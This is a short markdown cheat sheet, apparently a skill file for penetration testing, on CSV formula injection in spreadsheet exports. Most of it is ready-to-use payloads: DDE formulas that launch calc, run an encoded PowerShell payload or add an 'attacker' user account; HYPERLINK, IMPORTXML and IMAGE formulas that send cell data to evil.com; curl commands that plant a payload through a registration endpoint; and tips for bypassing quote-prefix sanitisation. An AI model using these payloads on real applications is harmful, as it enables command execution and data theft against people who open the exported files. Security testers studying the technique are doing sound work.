---
name: csv-injection
description: CSV formula injection in exported spreadsheets exploiting DDE, macro execution, and data exfiltration via crafted cell values
---

# CSV Injection

When applications export user-controlled data to CSV/XLSX, attackers can inject spreadsheet formulas that execute when opened in Excel or Google Sheets. This leads to command execution (DDE), data exfiltration, and phishing.

## Key Vulnerabilities

### Formula Injection Payloads

```
=cmd|'/C calc'!A0
=HYPERLINK("http://evil.com/steal?data="&A1,"Click here")
+cmd|'/C powershell -e BASE64PAYLOAD'!A0
-cmd|'/C net user attacker P@ss /add'!A0
@SUM(1+1)*cmd|'/C calc'!A0
=IMPORTXML("http://evil.com/steal","/x")
=IMAGE("http://evil.com/track?user="&B2)
```

### Testing

```bash
# Register with formula payload as username/name
curl -sk https://TARGET/api/register -X POST \
  -d 'name==cmd|'\''/C calc'\''!A0&email=test@test.com'

# Download CSV export and check if formula is preserved
curl -sk https://TARGET/api/export/users.csv | head -5
```

## Impact

- **Medium**: Command execution when victim opens CSV in Excel with DDE enabled
- **Medium**: Data exfiltration via HYPERLINK/IMPORTXML to attacker server
- **Low**: Phishing via crafted hyperlinks in spreadsheet

## Pro Tips

1. Test all export features: user lists, reports, analytics, transaction history
2. Prepend with `=`, `+`, `-`, `@`, `\t`, `\r` — all trigger formula interpretation
3. Google Sheets blocks DDE but supports `=IMPORTXML` and `=IMAGE` for exfiltration
4. If app prepends `'` to cell values starting with `=`, try tab/CR prefix to bypass
